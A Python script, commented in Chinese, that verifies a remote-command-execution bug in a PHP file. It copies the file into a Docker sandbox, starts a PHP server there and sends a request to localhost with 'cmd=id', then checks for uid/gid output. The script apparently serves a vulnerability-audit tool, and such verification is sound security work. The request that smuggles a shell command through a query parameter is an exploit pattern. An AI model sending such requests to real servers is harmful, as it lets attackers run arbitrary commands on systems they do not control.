
import asyncio
import base64
import os
import sys

# 添加 backend 目录到路径
sys.path.append(os.path.join(os.getcwd(), "backend"))

from app.services.agent.tools.sandbox_tool import SandboxManager, SandboxConfig

async def verify_rce():
    print("🚀 开始验证 RCE 漏洞...")
    
    # 1. 读取目标文件内容
    file_path = "ttt/t.php"
    if not os.path.exists(file_path):
        print(f"❌ 文件不存在: {file_path}")
        return

    with open(file_path, "rb") as f:
        content = f.read()
    
    b64_content = base64.b64encode(content).decode()
    print(f"📄 读取文件 {file_path} ({len(content)} bytes)")
    
    # 2. 初始化沙箱管理器
    # 注意：需要启用网络模式以便 curl 本地服务（虽然是 localhost，但 bridge 模式更稳妥，或者默认 none 也可以访问 localhost? 
    # Docker none 网络模式只有 loopback 接口，所以 localhost 是可以通的。
    # 但是为了保险，我们使用默认配置（通常是 none），如果不行再调整。
    # 这里的关键是 php server 和 curl 在同一个容器内运行。
    
    config = SandboxConfig()
    # 确保网络模式允许本地通信（none 模式下只有 lo，应该没问题）
    # 但有些环境可能需要 bridge
    # config.network_mode = "bridge" 
    
    manager = SandboxManager(config)
    await manager.initialize()
    
    if not manager.is_available:
        print("❌ Docker 沙箱不可用")
        return

    print("🐳 沙箱初始化成功")

    # 3. 构造验证 Payload
    # - 创建目录
    # - 写入文件 (使用 base64 避免转义问题)
    # - 启动 PHP 服务器 (后台运行)
    # - 等待服务器启动
    # - 发送恶意请求 (cmd=id)
    
    cmd_payload = "id"
    verification_url = f"http://localhost:8000/t.php?cmd={cmd_payload}"
    
    sandbox_cmd = (
        f"mkdir -p ttt && "
        f"echo '{b64_content}' | base64 -d > ttt/t.php && "
        f"TMPDIR=/workspace php -S 0.0.0.0:8000 -t ttt > php.log 2>&1 & "
        f"sleep 3 && "
        f"curl -v '{verification_url}' || (echo '--- PHP LOG ---' && cat php.log)"
    )
    
    print(f"⚡ 执行沙箱命令:\n{sandbox_cmd}\n")
    
    result = await manager.execute_command(sandbox_cmd, timeout=10)
    
    # 4. 分析结果
    print("📊 执行结果:")
    print(f"Success: {result['success']}")
    print(f"Exit Code: {result['exit_code']}")
    print(f"Stdout: {result['stdout'].strip()}")
    print(f"Stderr: {result['stderr'].strip()}")
    
    if result['success']:
        output = result['stdout']
        if "uid=" in output and "gid=" in output:
            print("\n✅ 漏洞验证成功！发现了命令执行结果。")
            print(f"证明: {output.strip()}")
        else:
            print("\n⚠️ 命令执行成功，但未发现预期的 id 命令输出。")
    else:
        print("\n❌ 验证执行失败。")

if __name__ == "__main__":
    asyncio.run(verify_rce())
